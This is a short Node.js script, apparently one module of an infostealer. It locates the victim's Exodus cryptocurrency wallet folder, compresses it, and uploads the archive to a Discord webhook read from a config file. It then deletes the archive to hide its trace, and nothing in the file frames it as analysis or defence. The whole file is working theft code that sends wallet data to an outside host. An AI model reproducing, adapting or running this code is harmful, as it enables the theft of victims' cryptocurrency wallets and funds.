const AdmZip = require("adm-zip"),
  Webhook = require("discord-webhook-node").Webhook,
  fs = require("fs"),
  username = process.env.USERNAME,
  config = require("../config.json");
(async () => {
  const e = `C:\\Users\\${username}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
  if (!fs.existsSync(e)) return;
  const o = new AdmZip();
  o.addLocalFolder(e),
    o.writeZip("C:\\Users\\tav08\\AppData\\Local\\Exodus.zip"),
    await new Webhook(config.webhook).sendFile(
      "C:\\Users\\tav08\\AppData\\Local\\Exodus.zip"
    ),
    fs.unlinkSync("C:\\Users\\tav08\\AppData\\Local\\Exodus.zip");
})();
